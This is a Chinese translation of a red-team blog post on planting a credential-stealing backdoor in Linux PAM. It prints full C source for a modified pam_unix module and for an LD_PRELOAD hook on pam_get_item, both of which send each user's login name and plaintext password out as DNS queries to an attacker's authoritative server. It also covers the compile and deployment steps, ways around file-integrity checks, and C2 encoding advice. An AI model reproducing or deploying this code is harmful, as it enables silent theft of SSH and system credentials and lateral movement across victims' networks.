> 原文链接: https://www.anquanke.com//post/id/150716 


# 通过 PAM 后门和 DNS 请求来泄漏用户凭据


                                阅读量   
                                **110109**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：x-c3ll.github.io
                                <br>原文地址：[https://x-c3ll.github.io/posts/PAM-backdoor-DNS/](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01728808f6cf91c37b.jpg)](https://p0.ssl.qhimg.com/t01728808f6cf91c37b.jpg)

## 前言

也许在渗透和红队中使用的最著名的Post-Exploitation技术之一，就是在PAM生态系统中打开后门来收集有效的凭证。通过后门获取的证书将帮助我们轻松地实现机器之间的横向移动。我们可以通过不同的选择来实现这一目标。

一个有趣的变化是将这种技术与传统的DNS数据渗漏技术(DNS exfiltration)相结合，这样我们就可以将凭据发送到我们的C&amp;C，而无需担心防火墙和通信规则。我们只需要向机器使用的DNS服务器发送一个DNS请求，然后它将被转发到其他DNS服务器，并且在某个时候该请求将攻击我们的权威DNS服务器。所以我们可以用这个众所周知的渠道默默地取回凭证。

我们的路线图非常简单：添加一个自定义PAM模块，该模块以明文记录凭证，并通过DNS解析将其发送到我们的C&amp;C。

顺便提一下：即使这是一个古老而著名的策略，它仍然是一个非常酷的来显示所需的文件完整性控件的方式。获取服务器根权限，等待管理员或操作员通过SSH登录并享受吧！



## 0x01 修改pam_unix_auth.c

(我们不会解释PAM是什么或者它是如何工作的。要获得有关PAM的更深入的信息，请使用man)。

为了检索明文中的用户和密码，我们将把有效的pam_unix.so模块替换为我们修改过的模块。如果我们检查原始模块的源代码(从[这里](http://www.linux-pam.org/library/)下载安装在目标服务器上的PAM版本的源代码)，我们可以在pam_unix_Auth.c文件中看到一个名为pam_sm_certiate的函数，并且在这个函数中调用_unix_Version_Password，其中的参数是身份验证中使用的用户名和密码：

```
// (...)
    /* verify the password of this user */
    retval = _unix_verify_password(pamh, name, p, ctrl);
    name = p = NULL;

    AUTH_RETURN;
`}`
// (...)
```

因此，在这一点上注入我们的过滤逻辑看起来很好。作为PoC，我们可以使用[这段代码](https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168)(SilverMoon-29/4/2009)，所以主要的外排逻辑还没有实现(这段代码有一些缺陷-例如，它没有将服务器IP从Resolv.conf-…中取走) 因此，如果要在真正的渗透中使用它，需要改进代码；D)。让vim文件pam_unix_Auth.c添加所需的函数和头文件！：

```
/* Fun starts here :)

 * pam_sm_authenticate() performs UNIX/shadow authentication
 *
 *      First, if shadow support is available, attempt to perform
 *      authentication using shadow passwords. If shadow is not
 *      available, or user does not have a shadow password, fallback
 *      onto a normal UNIX authentication
 */
/* Backdoor  - DNS code extracted from https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168 */


// The code sucks a lot. It is Sunday and I have a hangover, so I am not in the mood to fix it. 
// Tons of bug and useless code that you should remove. Forgive me, please :)

#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;

//List of DNS Servers registered on the system
char dns_servers[10][100];
int dns_server_count = 0;
//Types of DNS resource records :)

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//Function Prototypes
void ngethostbyname (unsigned char* , int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
unsigned char* ReadName (unsigned char*,unsigned char*,int*);
void get_dns_servers();

//DNS header structure
struct DNS_HEADER
`{`
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
`}`;

//Constant sized fields of query structure
struct QUESTION
`{`
    unsigned short qtype;
    unsigned short qclass;
`}`;

//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
`{`
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
`}`;
#pragma pack(pop)

//Pointers to resource record contents
struct RES_RECORD
`{`
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
`}`;

//Structure of a Query
typedef struct
`{`
    unsigned char *name;
    struct QUESTION *ques;
`}` QUERY;

/*
 * Perform a DNS query by sending a packet
 * */
void ngethostbyname(unsigned char *host , int query_type)
`{`
    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;

    struct sockaddr_in a;

    struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
    struct sockaddr_in dest;

    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;

    printf("Resolving %s" , host);

    s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(dns_servers[0]); //dns servers

    //Set the DNS structure to standard queries
    dns = (struct DNS_HEADER *)&amp;buf;

    dns-&gt;id = (unsigned short) htons(getpid());
    dns-&gt;qr = 0; //This is a query
    dns-&gt;opcode = 0; //This is a standard query
    dns-&gt;aa = 0; //Not Authoritative
    dns-&gt;tc = 0; //This message is not truncated
    dns-&gt;rd = 1; //Recursion Desired
    dns-&gt;ra = 0; //Recursion not available! hey we dont have it (lol)
    dns-&gt;z = 0;
    dns-&gt;ad = 0;
    dns-&gt;cd = 0;
    dns-&gt;rcode = 0;
    dns-&gt;q_count = htons(1); //we have only 1 question
    dns-&gt;ans_count = 0;
    dns-&gt;auth_count = 0;
    dns-&gt;add_count = 0;

    //point to the query portion
    qname =(unsigned char*)&amp;buf[sizeof(struct DNS_HEADER)];

    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&amp;buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it

    qinfo-&gt;qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo-&gt;qclass = htons(1); //its internet (lol)

    printf("nSending Packet...");
    if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&amp;dest,sizeof(dest)) &lt; 0)
    `{`
        perror("sendto failed");
    `}`
    printf("Done");

    //Receive the answer
    i = sizeof dest;
    printf("nReceiving answer...");
    if(recvfrom (s,(char*)buf , 65536 , 0 , (struct sockaddr*)&amp;dest , (socklen_t*)&amp;i ) &lt; 0)
    `{`
        perror("recvfrom failed");
    `}`
    printf("Done");

    dns = (struct DNS_HEADER*) buf;

    //move ahead of the dns header and the query field
    reader = &amp;buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];

    printf("nThe response contains : ");
    printf("n %d Questions.",ntohs(dns-&gt;q_count));
    printf("n %d Answers.",ntohs(dns-&gt;ans_count));
    printf("n %d Authoritative Servers.",ntohs(dns-&gt;auth_count));
    printf("n %d Additional records.nn",ntohs(dns-&gt;add_count));

    //Start reading answers
    stop=0;

    for(i=0;i&lt;ntohs(dns-&gt;ans_count);i++)
    `{`
        answers[i].name=ReadName(reader,buf,&amp;stop);
        reader = reader + stop;

        answers[i].resource = (struct R_DATA*)(reader);
        reader = reader + sizeof(struct R_DATA);

        if(ntohs(answers[i].resource-&gt;type) == 1) //if its an ipv4 address
        `{`
            answers[i].rdata = (unsigned char*)malloc(ntohs(answers[i].resource-&gt;data_len));

            for(j=0 ; j&lt;ntohs(answers[i].resource-&gt;data_len) ; j++)
            `{`
                answers[i].rdata[j]=reader[j];
            `}`

            answers[i].rdata[ntohs(answers[i].resource-&gt;data_len)] = '';

            reader = reader + ntohs(answers[i].resource-&gt;data_len);
        `}`
        else
        `{`
            answers[i].rdata = ReadName(reader,buf,&amp;stop);
            reader = reader + stop;
        `}`
    `}`

    //read authorities
    for(i=0;i&lt;ntohs(dns-&gt;auth_count);i++)
    `{`
        auth[i].name=ReadName(reader,buf,&amp;stop);
        reader+=stop;

        auth[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);

        auth[i].rdata=ReadName(reader,buf,&amp;stop);
        reader+=stop;
    `}`

    //read additional
    for(i=0;i&lt;ntohs(dns-&gt;add_count);i++)
    `{`
        addit[i].name=ReadName(reader,buf,&amp;stop);
        reader+=stop;

        addit[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);

        if(ntohs(addit[i].resource-&gt;type)==1)
        `{`
            addit[i].rdata = (unsigned char*)malloc(ntohs(addit[i].resource-&gt;data_len));
            for(j=0;j&lt;ntohs(addit[i].resource-&gt;data_len);j++)
            addit[i].rdata[j]=reader[j];

            addit[i].rdata[ntohs(addit[i].resource-&gt;data_len)]='';
            reader+=ntohs(addit[i].resource-&gt;data_len);
        `}`
        else
        `{`
            addit[i].rdata=ReadName(reader,buf,&amp;stop);
            reader+=stop;
        `}`
    `}`

    //print answers
    printf("nAnswer Records : %d n" , ntohs(dns-&gt;ans_count) );
    for(i=0 ; i &lt; ntohs(dns-&gt;ans_count) ; i++)
    `{`
        printf("Name : %s ",answers[i].name);

        if( ntohs(answers[i].resource-&gt;type) == T_A) //IPv4 address
        `{`
            long *p;
            p=(long*)answers[i].rdata;
            a.sin_addr.s_addr=(*p); //working without ntohl
            printf("has IPv4 address : %s",inet_ntoa(a.sin_addr));
        `}`

        if(ntohs(answers[i].resource-&gt;type)==5) 
        `{`
            //Canonical name for an alias
            printf("has alias name : %s",answers[i].rdata);
        `}`

        printf("n");
    `}`

    //print authorities
    printf("nAuthoritive Records : %d n" , ntohs(dns-&gt;auth_count) );
    for( i=0 ; i &lt; ntohs(dns-&gt;auth_count) ; i++)
    `{`

        printf("Name : %s ",auth[i].name);
        if(ntohs(auth[i].resource-&gt;type)==2)
        `{`
            printf("has nameserver : %s",auth[i].rdata);
        `}`
        printf("n");
    `}`

    //print additional resource records
    printf("nAdditional Records : %d n" , ntohs(dns-&gt;add_count) );
    for(i=0; i &lt; ntohs(dns-&gt;add_count) ; i++)
    `{`
        printf("Name : %s ",addit[i].name);
        if(ntohs(addit[i].resource-&gt;type)==1)
        `{`
            long *p;
            p=(long*)addit[i].rdata;
            a.sin_addr.s_addr=(*p);
            printf("has IPv4 address : %s",inet_ntoa(a.sin_addr));
        `}`
        printf("n");
    `}`
    return;
`}`

/*
 * 
 * */
u_char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
`{`
    unsigned char *name;
    unsigned int p=0,jumped=0,offset;
    int i , j;

    *count = 1;
    name = (unsigned char*)malloc(256);

    name[0]='';

    //read the names in 3www6google3com format
    while(*reader!=0)
    `{`
        if(*reader&gt;=192)
        `{`
            offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
            reader = buffer + offset - 1;
            jumped = 1; //we have jumped to another location so counting wont go up!
        `}`
        else
        `{`
            name[p++]=*reader;
        `}`

        reader = reader+1;

        if(jumped==0)
        `{`
            *count = *count + 1; //if we havent jumped to another location then we can count up
        `}`
    `}`

    name[p]=''; //string complete
    if(jumped==1)
    `{`
        *count = *count + 1; //number of steps we actually moved forward in the packet
    `}`

    //now convert 3www6google3com0 to www.google.com
    for(i=0;i&lt;(int)strlen((const char*)name);i++) 
    `{`
        p=name[i];
        for(j=0;j&lt;(int)p;j++) 
        `{`
            name[i]=name[i+1];
            i=i+1;
        `}`
        name[i]='.';
    `}`
    name[i-1]=''; //remove the last dot
    return name;
`}`

/*
 * Get the DNS servers from /etc/resolv.conf file on Linux
 * */
void get_dns_servers()
`{`
    FILE *fp;
    char line[200] , *p;
    if((fp = fopen("/etc/resolv.conf" , "r")) == NULL)
    `{`
        printf("Failed opening /etc/resolv.conf file n");
    `}`

    while(fgets(line , 200 , fp))
    `{`
        if(line[0] == '#')
        `{`
            continue;
        `}`
        if(strncmp(line , "nameserver" , 10) == 0)
        `{`
            p = strtok(line , " ");
            p = strtok(NULL , " ");

            //p now is the dns ip :)
            //????
        `}`
    `}`
    // EDIT THIS. It is a PoC 
    strcpy(dns_servers[0] , "127.0.0.1");

`}`

/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
`{`
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i &lt; strlen((char*)host) ; i++) 
    `{`
        if(host[i]=='.') 
        `{`
            *dns++ = i-lock;
            for(;lock&lt;i;lock++) 
            `{`
                *dns++=host[lock];
            `}`
            lock++; //or lock=i+1;
        `}`
    `}`
    *dns++='';
`}`
#define _UNIX_AUTHTOK  "-UN*X-PASS"
// (...)
```

最后，一点小修改：

```
// (...)
/* verify the password of this user */    
    retval = _unix_verify_password(pamh, name, p, ctrl);
    unsigned char hostname[100];
    get_dns_servers();
    snprintf(hostname, sizeof(hostname), "%s.%s.nowhere.local", name, p); // Change it with your domain
    if (fork() == 0) `{`
        ngethostbyname(hostname, T_A);
    `}`
    name = p = NULL;
// (...)
```

编译该模块(./configure &amp;&amp; make)，用我们的版本替换原来的pam_unix.so，然后打开一个tcpdump/wireshark并通过SSH登录到机器中：

```
DNS    96    Standard query 0x6d43  A mothra.RabbitHunt3r.nowhere.local
```

很好！完成了一个DNS请求，因此我们可以将用户名和密码转储到由我们控制的外部服务器。但现在我们遇到了一个问题：在密码中使用大写/小写/符号(uppercase / lowercase / symbols)会发生什么？在后面的0x03一节中，我们将讨论这一点。



## 0x02 LD_PRELOAD

在某些情况下，需要采取另一种办法。如果服务器对关键二进制文件(如pam_unix.so和其他模块)或配置文件执行任何类型的文件完整性检查，则需要使用经典的LD_PRELOAD策略。我们将预加载一个共享对象，该对象挂接PAM使用的一些函数，因此我们可以轻松地将我们的退出逻辑注入其中。

我们的目标函数将是pam_get_Item。当以项类型PAM_AUTHTOK作为参数调用此函数时，它检索所使用的身份验证令牌。我们将hook这个函数，因此当调用它时，我们将调用pam_get_user()来检索用户名，然后调用原始pam_get_Item(获得正确的返回值和身份验证令牌)，通过DNS将其过滤掉，最后返回之前获得的值。

```
/* Classic LD_PRELOAD PAM backdoor with DNS exfiltration */
// Author: Juan Manuel Fernandez (@TheXC3LL)

#define _GNU_SOURCE

#include &lt;security/pam_modules.h&gt;  
#include &lt;security/pam_ext.h&gt;  
#include &lt;security/pam_modutil.h&gt;  
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt; 
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt; 
#include &lt;dlfcn.h&gt; 
#include &lt;sys/stat.h&gt;
#include &lt;signal.h&gt;

// Insert here all the headers and functions needed for the DNS request
//(...)


typedef int (*orig_ftype) (const pam_handle_t *pamh, int item_type,  const void **item);

int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) `{`  
    int retval;
    int pid;
    const char *name; 
    orig_ftype orig_pam;
    orig_pam = (orig_ftype)dlsym(RTLD_NEXT, "pam_get_item"); 

    // Call original function  so we log password
    retval = orig_pam(pamh, item_type, item);

    // Log credential
    if (item_type == PAM_AUTHTOK &amp;&amp; retval == PAM_SUCCESS &amp;&amp; *item != NULL) `{`   
        unsigned char hostname[256];
        get_dns_servers();
        pam_get_user((pam_handle_t *)pamh, &amp;name, NULL);
        snprintf(hostname, sizeof(hostname), "%s.%s.nowhere.local", name, *item); // Change it with your domain
        if (fork() == 0) `{`
            ngethostbyname(hostname, T_A);
        `}`
    `}`   

    return retval; 
`}`
```

编译(gcc pam_fucked.c -shared -fPIC pam_fucked.so)，停止SSH守护进程，用LD_PRELOAD=/../module/location…/启动它

使用LD_PRELOAD几乎没有什么负面影响，比如需要重新启动守护进程，因此它可以生成其他类型的事件来警告蓝队。另一方面，如果要以SSH的形式重新启动关键服务，则必须从SSH以外的某个点(可能是反向shell)进行操作，并注意避免终止当前会话。



## 0x03 与C&amp;C的交流

如前所述，我们需要对将被过滤的数据进行编码(并对此信息进行真正的加密)。最好的选择是将其编码为十六进制或[base32](https://en.wikipedia.org/wiki/Base32)。C&amp;C必须配置为一个权威的DNS，最好是使用一个模拟公司使用的真实域的伪造的域名类型。

你可以安装一个真正的DNS服务器，或者只使用python和dnslb创建所需的逻辑。



## 0x04 最后

我希望你通过典型的DNS数据渗漏技术找到一种酷的方法。这是一种非常简单的方法，可以在最近受到攻击的服务器中获得新的凭据，并征服网络中的其他点。

就像我常说的，如果你发现错误或者想要评论什么，请在Twitter上联系我(<a>@TheXC3LL</a>)。
